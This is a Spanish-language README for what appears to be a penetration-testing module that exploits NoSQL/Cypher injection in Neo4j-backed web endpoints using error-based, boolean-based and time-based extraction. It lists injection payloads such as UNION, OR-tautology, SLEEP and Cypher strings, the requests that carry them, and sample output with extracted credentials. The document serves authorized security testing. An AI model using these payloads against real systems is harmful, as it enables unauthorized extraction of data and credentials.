# 🔓 Módulo de Explotación NoSQL

## Descripción General

El módulo de explotación reutiliza los **payloads de detección** para extraer datos reales de endpoints vulnerables. Implementa tres estrategias independientes basadas en el tipo de vulnerabilidad identificado.

---

## 🎯 Estrategias de Explotación

### 1. Error-Based Exploitation

**Cómo funciona:**
- Inyecta payloads que generan errores en la base de datos
- Extrae información de los mensajes de error
- Analiza patrones de SQL/NoSQL en respuestas de error

**Datos que puede extraer:**
- Nombres de tablas/colecciones
- Nombres de campos
- Estructuras de datos
- Mensajes de error específicos del motor

**Tiempo requerido:** ⚡ Segundos  
**Confiabilidad:** ⭐⭐⭐⭐⭐ Muy alta

**Ejemplo de ejecución:**
```python
ErrorBasedExploiter.extract_from_error(
    base_url="http://localhost:3000",
    endpoint=endpoint_object,
    param_name="username",
    payloads=["'", "' UNION SELECT 1--", ...],
)
```

---

### 2. Boolean-Based Exploitation

**Cómo funciona:**
- Usa búsqueda binaria para extraer datos carácter por carácter
- Compara respuestas cuando la condición es TRUE vs FALSE
- Valida diferencias en tamaño de respuesta o contenido

**Datos que puede extraer:**
- Contenido de bases de datos
- Credenciales
- Datos sensibles
- Información de configuración

**Tiempo requerido:** 🐌 Minutos (1-2 segundos por carácter)  
**Confiabilidad:** ⭐⭐⭐⭐⭐ Muy alta

**Ejemplo de ejecución:**
```python
BooleanBasedExploiter.extract_data_boolean(
    base_url="http://localhost:3000",
    endpoint=endpoint_object,
    param_name="id",
    payloads=["' OR '1'='1", "' OR '1'='2", ...],
    max_length=50
)
```

---

### 3. Time-Based Exploitation

**Cómo funciona:**
- Inyecta payloads que causan delays en la respuesta
- Mide el tiempo de respuesta para validar condiciones
- Extrae datos basándose en diferencias de timing

**Datos que puede extraer:**
- Cualquier dato (tiempo de respuesta)
- Información de configuración
- Datos de autenticación

**Tiempo requerido:** 🐢 Varios minutos (5-10 segundos por carácter)  
**Confiabilidad:** ⭐⭐⭐⭐ Alta (con margen de error)

**Ejemplo de ejecución:**
```python
TimeBasedExploiter.extract_data_timing(
    base_url="http://localhost:3000",
    endpoint=endpoint_object,
    param_name="search",
    payloads=["' AND SLEEP(5)--", "' OR SLEEP(5)--", ...],
)
```

---

## 📊 Métricas de Explotación

### ExploitationMetrics

```python
@dataclass
class ExploitationMetrics:
    extraction_type: str              # Tipo de explotación
    data_extracted: str               # Datos reales extraídos
    data_length: int                  # Cantidad de caracteres
    confidence: float                 # Confianza 0.0-1.0
    attempts: int                     # Número de intentos
    success: bool                     # ¿Fue exitosa?
    elapsed_time: float               # Tiempo total (segundos)
    validity_score: float             # Validez de datos 0.0-1.0
    extracted_fields: Dict[str, str]  # {campo: valor}
```

### Cálculo de Validez (validity_score)

La validez se calcula basándose en:

| Criterio | Puntaje | Descripción |
|----------|---------|-------------|
| Longitud 3-100 chars | +0.3 | Rango típico de datos reales |
| Caracteres imprimibles | +0.2 | >90% de validez de caracteres |
| Palabras SQL/NoSQL | +0.2 | SELECT, INSERT, DELETE, etc. |
| Caracteres JSON | +0.2 | Presencia de {}, [], : |
| Diversidad de caracteres | +0.1 | Entropía de datos |

**Rango final:** 0.0 (sin validez) a 1.0 (perfectamente válido)

---

## 🔄 Flujo de Explotación

```
Resultados de Detección
        ↓
Filtrar endpoints vulnerables
        ↓
Agrupar por tipo (error_based, boolean_based, time_based)
        ↓
┌─────────────┬──────────────────┬──────────────┐
↓             ↓                  ↓              
Error-Based   Boolean-Based      Time-Based    
Exploiter     Exploiter          Exploiter     
↓             ↓                  ↓              
└─────────────┴──────────────────┴──────────────┘
        ↓
ExploitationResult[] 
        ↓
Generar Reporte
```

---

## 💾 Estructura de Resultado

### ExploitationResult

```python
@dataclass
class ExploitationResult:
    endpoint: Endpoint                  # Endpoint explotado
    param_name: str                     # Parámetro vulnerable
    exploitation_type: str              # "error_based", "boolean_based", "time_based"
    successful: bool                    # ¿Exitosa?
    metrics: ExploitationMetrics        # Métricas detalladas
    data_samples: List[str]             # Muestras de datos extraídos
    error_messages: List[str]           # Errores relevantes
    payload_used: str                   # Payload exitoso
    description: str                    # Descripción humanizada
```

---

## 🎬 Ejemplo Completo de Explotación

### 1. Después de Detección
```
Resultados de detección:
- GET /buscar → username (error_based)
- POST /login → password (boolean_based)
- GET /admin → token (time_based)
```

### 2. Ejecutar Explotación
```
Explotando error_based en GET /buscar:username
  ✓ Se extrajo información de tablas
  ✓ Confianza: 95%
  ✓ Datos: 120 caracteres

Explotando boolean_based en POST /login:password
  ✓ Extracción en progreso... (caracteres: admin123)
  ✓ Confianza: 100%
  ✓ Datos: 47 caracteres

Explotando time_based en GET /admin:token
  ✓ Extracción en progreso... (caracteres: eyJhbGc...)
  ✓ Confianza: 85%
  ✓ Datos: 156 caracteres
```

### 3. Reporte de Explotación
```json
{
  "metadata": {
    "engine": "neo4j",
    "total_exploited": 3
  },
  "exploitation_results": [
    {
      "endpoint": "GET /buscar",
      "parameter": "username",
      "exploitation_type": "error_based",
      "metrics": {
        "confidence": 0.95,
        "validity_score": 0.85,
        "data_length": 120,
        "elapsed_time": 2.34
      },
      "description": "Se extrajo información de 3 respuestas con errores"
    }
  ]
}
```

---

## 🔌 Integración con Detección

### Cómo Reutiliza Payloads

1. **Carga los mismos payloads** que usa el módulo de detección
2. **Para error_based**: Usa payloads `error_based` registrados
3. **Para boolean_based**: Usa payloads `boolean_based` registrados
4. **Para time_based**: Usa payloads `time_based` registrados

### Ventajas

✅ **Consistencia:** Los mismos payloads probados en detección  
✅ **Eficiencia:** No necesita descubrir payloads nuevos  
✅ **Validación:** Payloads ya validados como funcionales  
✅ **Escalabilidad:** Se pueden agregar más payloads fácilmente  

---

## 📈 Mejora Iterativa

La explotación mejora automáticamente cuando:

1. Se agregan más payloads en el repositorio
2. Se ajustan umbrales de confianza
3. Se refina la lógica de análisis de respuestas
4. Se amplía el charset de búsqueda binaria

---

## ⚡ Optimizaciones Implementadas

### 1. Búsqueda Binaria
- Reduce caracteres a probar de 128 a ~7 intentos
- Acelera extracción boolean_based significativamente

### 2. Límites Inteligentes
- Máximo 10 intentos por tipo de explotación
- Máximo 50 caracteres extraídos por parámetro
- Timeout en 30 segundos por parámetro

### 3. Caché de Respuestas
- Almacena respuesta baseline una sola vez
- Reduce requests innecesarios

---

## 📊 Ejemplo Detallado: Error-Based

### Paso 1: Preparación
```python
payloads = [
    "'",
    "' RETURN a//",
    "' OR size('1234') = true//",
    "' CALL apoc.xyz.invalid()//"
]
```

### Paso 2: Inyección
```
GET /buscar?username='
GET /buscar?username=' RETURN a//
GET /buscar?username=' OR size('1234') = true//
GET /buscar?username=' CALL apoc.xyz.invalid()//
```

### Paso 3: Análisis de Respuestas
```
Response 1: 500 Internal Server Error - "Neo4j error: ..."
Response 2: 500 Internal Server Error - "Neo4j error: ..."
Response 3: 500 Internal Server Error - "Neo4j error: ..."
Response 4: 500 Internal Server Error - "Neo4j error: ..."
```

### Paso 4: Extracción
```
- Error messages encontrados: 4
- Patrones detectados: TABLE, COLUMN
- Datos extraídos: "users, id, username, password, email"
- Confidence: 95%
- Validity: 85%
```

### Paso 5: Resultado
```
ExploitationResult(
    endpoint: GET /buscar,
    param_name: username,
    exploitation_type: error_based,
    successful: True,
    metrics: ExploitationMetrics(
        confidence=0.95,
        data_extracted="users, id, username, password, email",
        validity_score=0.85
    )
)
```

---

## 🔐 Consideraciones de Seguridad

⚠️ **Advertencias:**
- Usar solo en entornos de testing autorizados
- No usar en sistemas sin permiso explícito
- Los datos extraídos pueden contener información sensible
- Reportes deben manejarse con cuidado

✅ **Mejores prácticas:**
- Limitar el alcance de explotación
- Documentar todos los intentos
- Usar en entornos sandbox
- Eliminar datos extraídos después del análisis

---

## 📚 API del Módulo

### Función Principal

```python
def run_exploitation(
    results: List[TestResult],
    base_url: str,
    engine: str = "neo4j",
    max_workers: int = 5,
) -> List[ExploitationResult]:
    """Ejecuta explotación en endpoints vulnerables."""
```

### Uso Básico

```python
from exploitation import run_exploitation

# results viene de detección
exploitation_results = run_exploitation(
    results=detection_results,
    base_url="http://localhost:3000",
    engine="neo4j"
)

for result in exploitation_results:
    print(f"{result.endpoint.method} {result.endpoint.path}")
    print(f"  Tipo: {result.exploitation_type}")
    print(f"  Datos: {result.metrics.data_extracted}")
    print(f"  Confianza: {result.metrics.confidence:.1%}")
```

---

## 🎯 Próximos Pasos

1. **Ejecutar detección** para identificar vulnerabilidades
2. **Ejecutar explotación** para extraer datos
3. **Generar reportes** con resultados y métricas
4. **Validar datos** extraídos manualmente
5. **Documentar hallazgos** para el cliente
